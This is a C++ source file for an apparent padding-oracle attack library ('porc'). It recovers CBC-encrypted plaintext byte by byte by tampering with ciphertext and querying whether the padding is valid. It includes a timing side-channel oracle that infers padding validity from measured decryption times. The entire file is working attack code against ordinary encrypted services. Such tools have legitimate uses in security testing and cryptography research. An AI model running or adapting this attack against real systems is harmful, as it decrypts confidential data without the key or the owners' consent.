#include <algorithm>
#include <memory>
#include <cassert>
#include <vector>
#include "porc.hpp"

namespace porc {

static void apply_padding(
    porc_provider &config,
    size_t block_size,
    const std::vector<uint8_t> &padding_mask,
    std::vector<uint8_t>::iterator block_begin)
{
    size_t padi = block_size - padding_mask.size();
    auto pm = padding_mask.crbegin();
    auto bi = block_begin + padi;
    while(padi < block_size) {
        *bi = config.get_padding_byte(padi, padding_mask.size() + 1) ^ *pm;

        ++padi;
        ++pm;
        ++bi;
    }
}

static std::vector<uint8_t> decrypt_block(
    porc_provider &config,
    std::vector<uint8_t> &iv,
    std::vector<uint8_t> &ct,
    std::vector<uint8_t>::const_iterator prev_block_end
)
{
    size_t block_size = iv.size();
    auto block_end = ct.size() > block_size ?
                         ct.end() - block_size:
                         iv.end();
    auto block_start = block_end - block_size;

    std::vector<uint8_t> padding_mask;
    std::vector<uint8_t> plaintext(block_size);
    for(size_t i = 1; i <= block_size; ++i) {
        uint8_t exp_pad_byte = config.get_padding_byte(i, i);
        --block_end;
        --prev_block_end;

        size_t v;
        for(v = 0; v < 0x100; ++v) {
            *block_end = v;
            if(config.is_well_padded(iv, ct)) {
                if(i == 1) {
                    // check for false positive
                    *(block_end - 1) ^= 1;
                    if(config.is_well_padded(iv, ct))
                        break;
                } else {
                    break;
                }
            }
        }
        padding_mask.push_back(exp_pad_byte ^ v);
        plaintext[block_size - i] = *prev_block_end ^ exp_pad_byte ^ v;
        apply_padding(config, block_size, padding_mask, block_start);

        config.on_new_byte(plaintext, block_size - i);
    }

    return plaintext;
}

std::vector<uint8_t> decrypt(
    porc_provider &config,
    const std::vector<uint8_t> &iv,
    const std::vector<uint8_t> &ciphertext
)
{
    std::vector<uint8_t> plaintext;
    size_t block_size = iv.size();
    size_t block_count = ciphertext.size() / block_size;
    assert(ciphertext.size() % block_size == 0);

    std::vector<uint8_t> ct(ciphertext);
    for(size_t block = 0; block < block_count; ++block) {
        // set last block
        std::copy(ciphertext.begin() + block * block_size,
                  ciphertext.begin() + (block + 1) * block_size,
                  ct.end() - block_size);

        config.on_new_block(iv, ciphertext, ct);
        auto prev_block_start = block == 0 ? iv.begin() : ciphertext.begin() + (block - 1) * block_size;
        auto prev_block_end = prev_block_start + block_size;

        std::vector<uint8_t> iv_tmp(iv);

        auto block_pt = decrypt_block(config, iv_tmp, ct, prev_block_end);
        plaintext.insert(plaintext.end(), block_pt.begin(), block_pt.end());
    }
    return plaintext;
}

namespace stats {

void mean_collector::add(int64_t v)
{
    this->sum += (uintmax_t)v;
    ++this->n;
}

int64_t mean_collector::reset()
{
    assert(this->n > 0);
    int64_t r = this->sum / this->n;
    this->sum = 0;
    this->n = 0;
    return r;
}

void median_collector::add(int64_t v)
{
    this->values.push_back(v);
}

int64_t median_collector::reset()
{
    assert(!this->values.empty());
    std::sort(this->values.begin(), this->values.end());
    int64_t r = this->values[this->values.size() / 2];
    this->values.clear();
    return r;
}

}

namespace timed {

timed_porc::timed_porc(
    porc::stats::collector *st,
    decryptor_factory *dec,
    unsigned measurement_repetitions,
    bool measure_error)
: reps(measurement_repetitions), stats(st), decryptor(dec)
{
    this->measured.measure_error = measure_error;
}

int64_t timed_porc::measure_decryptions(const std::vector<uint8_t> &iv, const std::vector<uint8_t> &a)
{
    auto dec = this->decryptor->get(iv, a);
    for(unsigned i = 0; i < this->reps; ++i)
        this->stats->add(dec->measure());
    return this->stats->reset();
}

void timed_porc::on_new_byte(
    const std::vector<uint8_t> &block_pt,
    size_t pt_start_ind)
{
    this->measured.plaintext.assign(block_pt.begin() + pt_start_ind, block_pt.end());
    this->decryptor->on_progress(progress::BYTE, this->measured);
}

void timed_porc::on_new_block(
    const std::vector<uint8_t> &orig_iv,
    const std::vector<uint8_t> &orig_ct,
    const std::vector<uint8_t> &playground_ct)
{
    this->measured.good_time = this->measure_decryptions(orig_iv, orig_ct);
    // change playground_ct, so it is very unlikely to have good padding
    // well very unlikely is still more likely than 1/256
    std::vector<uint8_t> pg(playground_ct);
    ++pg[pg.size() - 1];

    this->measured.bad_time = this->measure_decryptions(orig_iv, pg);
    if(this->measured.measure_error)
        this->measured.error = this->measured.bad_time - this->measure_decryptions(orig_iv, pg);

    this->decryptor->on_progress(progress::BLOCK, this->measured);
}

bool timed_porc::is_good(int64_t current)
{
    auto avg = (this->measured.good_time + this->measured.bad_time) / 2;
    if(this->measured.good_time > this->measured.bad_time)
        return current > avg;
    else
        return current < avg;
}

bool timed_porc::is_well_padded(
            const std::vector<uint8_t> &iv,
            const std::vector<uint8_t> &data)
{
    this->measured.current = this->measure_decryptions(iv, data);
    this->measured.guess = this->is_good(this->measured.current);

    this->decryptor->on_progress(progress::MEASUREMENT, this->measured);
    ++this->measured.iter;
    return this->measured.guess;
}

}

}
